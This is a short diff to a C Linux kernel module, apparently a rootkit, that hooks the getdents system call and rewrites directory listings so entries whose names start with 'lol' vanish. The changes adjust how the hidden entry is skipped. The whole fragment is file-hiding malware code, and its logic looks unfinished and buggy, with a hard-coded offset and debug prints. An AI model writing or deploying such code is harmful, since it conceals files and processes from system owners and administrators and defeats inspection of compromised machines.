@@ -121,12 +121,11 @@ struct linux_dirent {
 
 static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
     *dirp, unsigned int count) {
-  int i,j;
+  int i, j;
   char *p;
   char* userp, *buf;
   int ret;
   mm_segment_t old_fs;
-  char name[4] = {0};
 
   old_fs = get_fs();
   set_fs(KERNEL_DS);
@@ -140,8 +139,11 @@ static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
     buf[j] = buf[i];
     if (strncmp(buf + i, "lol", 3) == 0) {
       printk("Found\n");
+      for (; buf[i] != '\0'; i++);
+      for (; i % 8 != 0; i++);
+      i--;
       j -= 19;
-      i += 5;
+      //i += 5;
     }
     if (i == ret - 1)
       printk("end\n");
